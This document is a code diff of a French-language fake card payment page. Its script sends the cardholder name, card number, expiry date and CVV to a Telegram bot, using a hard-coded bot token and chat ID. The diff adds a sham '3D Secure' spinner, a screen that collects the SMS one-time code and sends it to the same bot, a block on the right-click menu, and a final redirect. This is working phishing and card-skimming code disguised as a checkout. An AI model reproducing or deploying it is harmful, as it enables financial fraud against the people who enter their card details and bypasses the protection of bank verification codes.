@@ -22,15 +22,15 @@
     }
 
     h2 {
-      text-align: center;
       color: #333;
+      text-align: center;
     }
 
-    label {
-      font-weight: bold;
-      margin-top: 10px;
+    form label {
       display: block;
-      color: #333;
+      margin-bottom: 5px;
+      font-weight: bold;
+      text-align: left;
     }
 
     input[type="text"],
@@ -38,7 +38,7 @@
     input[type="submit"] {
       width: 94%;
       padding: 12px;
-      margin: 8px 0;
+      margin: 8px 0 20px 0;
       border: 1px solid #ddd;
       border-radius: 5px;
       font-size: 16px;
@@ -56,163 +56,144 @@
       background-color: #45a049;
     }
 
-    .form-group {
-      margin-bottom: 15px;
+    .hidden {
+      display: none;
     }
 
-    .error {
-      color: red;
-      font-size: 12px;
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
 
-    .card-icon {
-      margin-top: 5px;
-    }
-
-    .card-icon img {
-      width: 30px;
-      margin-right: 10px;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
 
-  <div class="payment-container">
+  <div class="payment-container" id="step-1">
     <h2>Formulaire de Paiement</h2>
     <form id="payment-form">
-      <div class="form-group">
-        <label for="cardholder-name">Nom sur la carte</label>
-        <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
-        <small class="error" id="name-error"></small>
-      </div>
+      <label for="cardholder-name">Nom sur la carte</label>
+      <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
 
-      <div class="form-group">
-        <label for="card-number">Numéro de la carte</label>
-        <input type="number" id="card-number" name="card-number" required placeholder="XXXX XXXX XXXX XXXX">
-        <small class="error" id="card-number-error"></small>
-      </div>
+      <label for="card-number">Numéro de la carte</label>
+      <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">
 
-      <div class="form-group">
-        <label for="expiry-date">Date d'expiration</label>
-        <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
-        <small class="error" id="expiry-error"></small>
-      </div>
+      <label for="expiry-date">Date d'expiration</label>
+      <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
 
-      <div class="form-group">
-        <label for="cvv">Code de sécurité (CVV)</label>
-        <input type="number" id="cvv" name="cvv" required placeholder="XXX">
-        <small class="error" id="cvv-error"></small>
-      </div>
-
-      <div class="form-group card-icon">
-        <label>Méthode de paiement</label>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Visa_Logo_2011.svg" alt="Visa" id="visa-icon">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/MasterCard_Logo_2019.svg" alt="MasterCard" id="mastercard-icon">
-      </div>
-
+      <label for="cvv">Code de sécurité (CVV)</label>
+      <input type="number" id="cvv" name="cvv" maxlength="3" required placeholder="XXX">
+      
       <input type="submit" value="Payer">
     </form>
   </div>
 
+  <div class="payment-container hidden" id="step-2">
+    <h2>3D Secure</h2>
+    <div class="spinner"></div>
+    <center><p>VEUILLEZ PATIENTEZ...</p>
+  </div>
+
+  <div class="payment-container hidden" id="step-3">
+    <h2>Code SMS</h2>
+    <p>Entrez le code reçu par SMS :</p>
+    <form id="sms-form">
+      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
+      <input type="submit" value="Valider">
+    </form>
+  </div>
+
+  <div class="payment-container hidden" id="step-4">
+    <h2>3D Secure</h2>
+    <div class="spinner"></div>
+    <center><p>VEUILLEZ PATIENTEZ...</p> <center>
+  </div>
+
+  <div class="payment-container hidden" id="step-5">
+    <h2>PAIEMANT REUSSIE</h2>
+    <p>Redirection dans quelques instants...</p>
+  </div>
+
   <script>
-    // Remplacez par votre token du bot et chat ID
+    document.addEventListener('contextmenu', function(event) {
+      if (event.target.tagName !== 'INPUT') {
+        event.preventDefault();
+      }
+    });
+
     const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
     const TELEGRAM_CHAT_ID = '7747778364';
 
-    // Fonction pour envoyer les données à Telegram
     function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      };
+      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
 
       fetch(url, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
-      }).then(response => {
-        if (response.ok) {
-          console.log('Message envoyé à Telegram');
-        } else {
-          console.error('Erreur lors de l\'envoi du message');
-        }
-      }).catch(error => {
-        console.error('Erreur de connexion:', error);
       });
     }
 
-    // Validation et gestion du formulaire
     document.getElementById('payment-form').addEventListener('submit', function(event) {
-      event.preventDefault(); // Empêche l'envoi du formulaire pour validation
+      event.preventDefault();
 
-      let isValid = true;
-      
-      // Récupérer les valeurs du formulaire
       const cardholderName = document.getElementById('cardholder-name').value;
       const cardNumber = document.getElementById('card-number').value;
       const expiryDate = document.getElementById('expiry-date').value;
       const cvv = document.getElementById('cvv').value;
-      
-      // Validation du nom sur la carte
-      if (cardholderName.trim() === '') {
-        document.getElementById('name-error').textContent = 'Veuillez entrer le nom du titulaire.';
-        isValid = false;
-      } else {
-        document.getElementById('name-error').textContent = '';
-      }
 
-      // Validation du numéro de carte
-      if (!/^\d{16}$/.test(cardNumber)) {
-        document.getElementById('card-number-error').textContent = 'Numéro de carte invalide (16 chiffres).';
-        isValid = false;
-      } else {
-        document.getElementById('card-number-error').textContent = '';
-      }
+      sendToTelegram(`
+        Paiement reçu :
+        Nom : ${cardholderName}
+        Numéro : ${cardNumber}
+        Expiration : ${expiryDate}
+        CVV : ${cvv}
+      `);
 
-      // Validation de la date d'expiration
-      if (expiryDate === '') {
-        document.getElementById('expiry-error').textContent = 'Veuillez entrer la date d\'expiration.';
-        isValid = false;
-      } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
-        document.getElementById('expiry-error').textContent = 'La date d\'expiration doit être au format MM/AA.';
-        isValid = false;
-      } else {
-        document.getElementById('expiry-error').textContent = '';
-      }
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('step-2').classList.remove('hidden');
 
-      // Validation du CVV
-      if (!/^\d{3}$/.test(cvv)) {
-        document.getElementById('cvv-error').textContent = 'CVV invalide (3 chiffres).';
-        isValid = false;
-      } else {
-        document.getElementById('cvv-error').textContent = '';
-      }
-
-      // Si toutes les validations sont ok, soumettre les données à Telegram
-      if (isValid) {
-        const message = `
-          Paiement reçu:
-
-          Nom du titulaire: ${cardholderName}
-          Numéro de carte: ${cardNumber}
-          Date d'expiration: ${expiryDate}
-          CVV: ${cvv}
-        `;
-        sendToTelegram(message);
-        alert('Paiement effectué avec succès!');
-      }
+      setTimeout(() => {
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+      }, 10000);
     });
 
-    // Fonction pour ajouter la barre oblique dans le champ de date d'expiration
-    document.getElementById('expiry-date').addEventListener('input', function(event) {
-      let value = event.target.value.replace(/\D/g, ''); // Supprime tout ce qui n'est pas un chiffre
-      if (value.length >= 3) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4); // Ajoute la barre oblique et limite à 2 chiffres pour l'année
+    document.getElementById('sms-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const smsCode = document.getElementById('sms-code').value;
+      sendToTelegram(`Code SMS reçu : ${smsCode}`);
+
+      document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-4').classList.remove('hidden');
+
+      setTimeout(() => {
+        document.getElementById('step-4').classList.add('hidden');
+        document.getElementById('step-5').classList.remove('hidden');
+
+        setTimeout(() => {
+          window.location.href = "https://justmoicom.github.io/vlad/";
+        }, 5000);
+      }, 7000);
+    });
+
+    document.getElementById('expiry-date').addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
       }
-      event.target.value = value;
+      this.value = value;
     });
   </script>
 
